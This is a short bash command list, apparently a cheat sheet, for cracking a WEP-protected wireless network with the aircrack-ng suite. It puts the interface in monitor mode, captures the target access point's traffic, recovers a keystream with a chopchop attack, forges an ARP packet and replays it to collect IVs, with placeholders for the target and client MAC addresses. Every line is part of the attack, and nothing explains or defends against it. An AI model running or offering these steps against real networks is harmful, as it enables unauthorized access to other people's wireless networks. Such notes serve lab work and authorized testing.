
```bash
airmon-ng start wlan0
airodump-ng wlan0mon
airodump-ng wlan0mon --bssid <AP_MAC> -c <channel> -w WEP

aireplay-ng -4 -b <AP_MAC> -h <CLIENT_MAC> wlan0mon
y
tcpdump -s 0 -n -e -r <CAP_FILE>.cap
(Grab source and destination IP address)

packetforge-ng -0 -a <AP_MAC> -h <CLIENT_MAC> -k <DESTINATION_IP> -l <SOURCE_IP> -y <XOR_FILE>.xor -w forgedarp.cap

aireplay-ng -2 -r forgedarp.cap -h <CLIENT_MAC> wlan0mon
aireplay-ng -3 -b <AP_MAC> -h <CLIENT_MAC> wlan0mon
```